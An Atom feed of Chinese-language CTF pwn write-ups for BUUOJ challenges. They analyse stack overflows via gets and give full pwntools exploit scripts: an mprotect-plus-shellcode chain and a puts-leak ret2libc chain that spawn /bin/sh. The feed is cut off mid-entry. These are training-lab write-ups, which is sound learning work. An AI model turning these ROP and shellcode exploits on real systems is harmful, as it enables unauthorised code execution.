<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ruom0</title>
  
  
  <link href="https://www.ruomo.fun/atom.xml" rel="self"/>
  
  <link href="https://www.ruomo.fun/"/>
  <updated>2021-06-21T10:52:50.425Z</updated>
  <id>https://www.ruomo.fun/</id>
  
  <author>
    <name>ruom0</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>not_the_same_3dsctf_2016</title>
    <link href="https://www.ruomo.fun/2021/06/21/buuoj/not_the_same_3dsctf_2016/"/>
    <id>https://www.ruomo.fun/2021/06/21/buuoj/not_the_same_3dsctf_2016/</id>
    <published>2021-06-21T09:34:51.325Z</published>
    <updated>2021-06-21T10:52:50.425Z</updated>
    
    <content type="html"><![CDATA[<p>checksec结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ checksec --file=not_the_same_3dsctf_2016                                                                                                    1 ⨯</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE</span><br><span class="line">Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   1991) Symbols     No    0               0               not_the_same_3dsctf_2016</span><br></pre></td></tr></table></figure><p>拖入ida，找到<code>main</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">45</span>]; <span class="comment">// [esp+Fh] [ebp-2Dh] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;b0r4 v3r s3 7u 4h o b1ch4o m3m0... &quot;</span>);</span><br><span class="line">  gets(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显可以栈溢出。</p><p>在main函数上面有一个函数<code>get_secret</code>，看看源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_secret</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// esi</span></span><br><span class="line"></span><br><span class="line">  v0 = fopen(<span class="string">&quot;flag.txt&quot;</span>, &amp;unk_80CF91B);</span><br><span class="line">  fgets(&amp;fl4g, <span class="number">45</span>, v0);</span><br><span class="line">  <span class="keyword">return</span> fclose(v0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>他将flag.txt的内容从文件中读出，保存到fl4g中，双击fl4g可以看到<code>.bss:080ECA2D fl4g            db    ? ;               ; DATA XREF: get_secret+26↑o</code></p><p>说明fl4g在bss段上面。</p><p>尝试了一下用栈溢出跳转到<code>get_secret</code>，然后让他溢出跳转到<code>write</code>来输出fl4g中的内容，失败了，应该是fgets的原因。</p><p>搜了一下存在函数<code>mprotect</code>，这个函数可以修改一段指定内存区域的保护属性。</p><div class="hide-toggle" ><div class="hide-button toggle-title" style=""><i class="fas fa-caret-right fa-fw"></i><span>mprotect小知识</span></div>    <div class="hide-content"><p>Linux手册：<a class="btn-beautify button--animated " href="https://man7.org/linux/man-pages/man2/mprotect.2.html"   title="mprotect"><i class="far fa-hand-point-right"></i><span>mprotect</span></a></p><p>函数原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mmap.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mprotect</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *start, <span class="keyword">size_t</span> len, <span class="keyword">int</span> prot)</span></span>;</span><br></pre></td></tr></table></figure><ul><li>start: 修改的内存的起始地址</li><li>len: 修改的内存的长度</li><li>prot: 修改后的属性<ul><li>PROT_READ（4）: 表示内存段的内容可读</li><li>PROT_WRITE（2）: 表示内存段的内容可写</li><li>PROT_EXEC（1）: 表示内存段的内容可执行</li><li>PROT_NONE（0）: 表示内存段的内容无法访问</li></ul></li></ul><p>调用成功返回0，发生错误返回-1。</p></div></div><p>由于mprotect有3个参数，我们需要用寄存器传参，用<code>ROPgadget --binary not_the_same_3dsctf_2016 --only &quot;pop|ret&quot; | grep pop</code>找一下有3个pop的ret。</p><p>看了一下有超级多，看一下<code>mprotect</code>函数的汇编，关于传参的情况</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:0806ED40 arg_0           = dword ptr  4</span><br><span class="line">.text:0806ED40 arg_4           = dword ptr  8</span><br><span class="line">.text:0806ED40 arg_8           = dword ptr  0Ch</span><br><span class="line">.text:0806ED40</span><br><span class="line">.text:0806ED40 ; __unwind &#123;</span><br><span class="line">.text:0806ED40                 push    ebx</span><br><span class="line">.text:0806ED41                 mov     edx, [esp+4+arg_8]</span><br><span class="line">.text:0806ED45                 mov     ecx, [esp+4+arg_4]</span><br><span class="line">.text:0806ED49                 mov     ebx, [esp+4+arg_0]</span><br></pre></td></tr></table></figure><p>三个参数依次是arg_0、arg_4、arg_8，然后将arg_8存到edx中，将arg_4存到ecx中，将arg_0存到ebx中。根据这个规则，要保证参数在pop之后存放的寄存器不会因为这边的mov而导致数据错乱。最后筛选下来符合条件的是<code>0x0806fcc8 : pop esi ; pop ebx ; pop edx ; ret</code>。</p><p>我们需要的是将.plt.got表改为可读可写可执行（7）的属性，因此需要知道地址，在ida中按下Ctrl + S即可看到.plt.got表起始地址是<code>0x80EB000</code></p><p>在.plt.got表可读可写可执行后，我们需要将shellcode写入，再执行shellcode，具体步骤如下：</p><ol><li>将<code>main</code>函数的返回地址改为函数<code>mprotect</code>的地址</li><li>通过pop将参数传入<code>mprotect</code>，修改.plt.got表的保护属性</li><li>将ret的返回地址设置为<code>read</code>的地址</li><li>通过pop将参数传入<code>read</code>，输入shellcode</li><li>将ret的返回地址设置为.plt.got的起始地址，执行shellcode</li></ol><p>根据以上思路得出脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">1</span></span><br><span class="line">file_name = <span class="string">&#x27;./not_the_same_3dsctf_2016&#x27;</span></span><br><span class="line">host = <span class="string">&#x27;node3.buuoj.cn&#x27;</span></span><br><span class="line">port = <span class="number">28299</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"><span class="keyword">if</span> is_debug:</span><br><span class="line">sh = process(file_name)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">sh = remote(host, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">read_addr = elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pop3_ret = <span class="number">0x806fcc8</span></span><br><span class="line">mpro_addr = <span class="number">0x806ed40</span></span><br><span class="line">plt_got_addr = <span class="number">0x80eb000</span></span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x2d</span> + p32(mpro_addr) + p32(pop3_ret)</span><br><span class="line">payload += p32(plt_got_addr) + p32(<span class="number">0x20</span>) + p32(<span class="number">0x7</span>)</span><br><span class="line"></span><br><span class="line">payload += p32(read_addr) + p32(pop3_ret)</span><br><span class="line">payload += p32(<span class="number">0</span>) + p32(plt_got_addr) + p32(<span class="built_in">len</span>(shellcode)) + p32(plt_got_addr)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;checksec结果：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/sp</summary>
      
    
    
    
    <category term="buuoj" scheme="https://www.ruomo.fun/categories/buuoj/"/>
    
    
    <category term="buuoj" scheme="https://www.ruomo.fun/tags/buuoj/"/>
    
    <category term="pwn" scheme="https://www.ruomo.fun/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>ciscn_2019_en_2</title>
    <link href="https://www.ruomo.fun/2021/06/21/buuoj/ciscn_2019_en_2/"/>
    <id>https://www.ruomo.fun/2021/06/21/buuoj/ciscn_2019_en_2/</id>
    <published>2021-06-21T09:11:34.426Z</published>
    <updated>2021-06-21T11:07:12.727Z</updated>
    
    <content type="html"><![CDATA[<p>由于和ciscn_2019_c_1一模一样（脚本一样，程序一样），所以就不直接展示了……懒得去c1的可以自己展开来看。</p><div class="hide-toggle" ><div class="hide-button toggle-title" style=""><i class="fas fa-caret-right fa-fw"></i><span>ciscn_2019_c_1题解</span></div>    <div class="hide-content"><p>checksec结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE</span><br><span class="line">Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   85) Symbols       No    0               1               ciscn_2019_c_1</span><br></pre></td></tr></table></figure><p>拖入ida64分析，<code>main</code>函数没有什么价值，就是判断输入内容，1就调用<code>encrypt</code>函数；2就让你自己解密，他不管；3就结束。</p><p>唯一可以看的就一个加密函数，代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">encrypt</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  __int16 v3; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your Plaintext to be encrypted&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)x;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt;= <span class="built_in">strlen</span>(s) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( s[x] &lt;= <span class="number">96</span> || s[x] &gt; <span class="number">122</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( s[x] &lt;= <span class="number">64</span> || s[x] &gt; <span class="number">90</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( s[x] &gt; <span class="number">47</span> &amp;&amp; s[x] &lt;= <span class="number">57</span> )</span><br><span class="line">          s[x] ^= <span class="number">0xF</span>u;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        s[x] ^= <span class="number">0xE</span>u;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      s[x] ^= <span class="number">0xD</span>u;</span><br><span class="line">    &#125;</span><br><span class="line">    ++x;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Ciphertext&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>刚进函数，就有一个gets入眼，那么搜索一下危险函数，然而并没有任何发现。那这题就只能自己构造ROP去调用system(‘/bin/sh’)了，这里利用puts函数来计算地址。</p><p>首先用ROPgadget搜一下pop rdi ; ret和ret</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ ROPgadget --binary ./ciscn_2019_c_1 --only <span class="string">&quot;pop|ret&quot;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x0000000000400c7c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400c7e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400c80 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400c82 : pop r15 ; ret</span><br><span class="line">0x0000000000400c7b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400c7f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004007f0 : pop rbp ; ret</span><br><span class="line">0x0000000000400aec : pop rbx ; pop rbp ; ret</span><br><span class="line">0x0000000000400c83 : pop rdi ; ret</span><br><span class="line">0x0000000000400c81 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x0000000000400c7d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004006b9 : ret</span><br><span class="line">0x00000000004008ca : ret 0x2017</span><br><span class="line">0x0000000000400962 : ret 0x458b</span><br><span class="line">0x00000000004009c5 : ret 0xbf02</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 15</span><br><span class="line">                                                                                                                                                   </span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ ROPgadget --binary ./ciscn_2019_c_1 --only <span class="string">&quot;ret&quot;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x00000000004006b9 : ret</span><br><span class="line">0x00000000004008ca : ret 0x2017</span><br><span class="line">0x0000000000400962 : ret 0x458b</span><br><span class="line">0x00000000004009c5 : ret 0xbf02</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 4</span><br></pre></td></tr></table></figure><p>找到pop rdi ; ret地址<code>0x400c83</code>，ret地址<code>0x4006b9</code>。</p><p>首先需要泄露出puts函数的地址，这样才能算出system函数和字符串/bin/sh的地址。为了节省时间，第一个字符用<code>\x00</code>来绕过strlen以此来跳过循环加密。因为后面还需要调用<code>system('/bin/sh')</code>，因此还需要再执行一次main函数。</p><p>根据以上条件构造出第一个payload：<code>payload1 = b'\x00' + b'a' * 0x57 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(_start_addr)</code></p><p>先用这部分看看输出情况，写出如下脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">1</span></span><br><span class="line">file_name = <span class="string">&#x27;./ciscn_2019_c_1&#x27;</span></span><br><span class="line">host = <span class="string">&#x27;node3.buuoj.cn&#x27;</span></span><br><span class="line">port = <span class="number">25980</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"><span class="keyword">if</span> is_debug:</span><br><span class="line">sh = process(file_name)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">sh = remote(host, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">pop_rdi_ret = <span class="number">0x400c83</span></span><br><span class="line">ret = <span class="number">0x4006b9</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">_start_addr = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x57</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(_start_addr)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Input your choice!\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>, payload1)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ python3 exp.py                                                                                                                             1 ⨯</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>: pid 3461</span><br><span class="line">[*] <span class="string">&#x27;/home/kali/Desktop/ciscn_2019_c_1&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">4196064</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Ciphertext</span><br><span class="line"></span><br><span class="line">\xf0\x85j\xe0\x7f</span><br><span class="line">EEEEEEE                            hh      iii                </span><br><span class="line">EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  </span><br><span class="line">EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e </span><br><span class="line">EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  </span><br><span class="line">EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee </span><br><span class="line">====================================================================</span><br><span class="line">Welcome to this Encryption machine</span><br><span class="line"></span><br><span class="line">====================================================================</span><br><span class="line">1.Encrypt</span><br><span class="line">2.Decrypt</span><br><span class="line">3.Exit</span><br><span class="line">Input your choice!</span><br><span class="line">$</span><br></pre></td></tr></table></figure><p>从上面可以看到puts函数的地址被泄露出来了，接下来就是用LibcSearcher来搜索puts的在libc中的地址，然后计算偏移量，再用system和/bin/sh在libc中的地址加上偏移量得到真实地址。然后再溢出调用system(‘/bin/sh’)。</p><p>最终脚本如下：</p><blockquote><p>ps: 这边不知道为什么，我本地libc用2.31的EOF，然后我指定用2.27直接EOF，输入都不给输入。。但是buu的服务器上面上去让我选又得选那个2.27的才能正常通过……迷惑。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">1</span></span><br><span class="line">file_name = <span class="string">&#x27;./ciscn_2019_c_1&#x27;</span></span><br><span class="line">host = <span class="string">&#x27;node3.buuoj.cn&#x27;</span></span><br><span class="line">port = <span class="number">28565</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"><span class="keyword">if</span> is_debug:</span><br><span class="line">sh = process(file_name)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">sh = remote(host, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">pop_rdi_ret = <span class="number">0x400c83</span></span><br><span class="line">ret = <span class="number">0x4006b9</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">_start_addr = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x57</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(_start_addr)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Input your choice!\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>, payload1)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Ciphertext\n&#x27;</span>)</span><br><span class="line">sh.recvline()</span><br><span class="line">puts_addr = u64(sh.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x57</span> + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(sys_addr)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Input your choice!\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>, payload2)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure></div></div>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;由于和ciscn_2019_c_1一模一样（脚本一样，程序一样），所以就不直接展示了……懒得去c1的可以自己展开来看。&lt;/p&gt;
&lt;div class=&quot;hide-toggle&quot; &gt;&lt;div class=&quot;hide-button toggle-title&quot; style=&quot;&quot;&gt;</summary>
      
    
    
    
    <category term="buuoj" scheme="https://www.ruomo.fun/categories/buuoj/"/>
    
    
    <category term="buuoj" scheme="https://www.ruomo.fun/tags/buuoj/"/>
    
    <category term="pwn" scheme="https://www.ruomo.fun/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>jarvisoj_level2</title>
    <link href="https://www.ruomo.fun/2021/06/21/buuoj/jarvisoj_level2/"/>
    <id>https://www.ruomo.fun/2021/06/21/buuoj/jarvisoj_level2/</id>
    <published>2021-06-21T08:49:25.420Z</published>
    <updated>2021-06-21T09:04:00.415Z</updated>
    
    <content type="html"><![CDATA[<p>checksec结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ checksec --file=level2        </span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE</span><br><span class="line">Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   70) Symbols       No    0               1               level2</span><br></pre></td></tr></table></figure><p>拖入ida分析，由于<code>main</code>函数没什么价值，直接看<code>vulnerable_function</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vulnerable_function</span><span 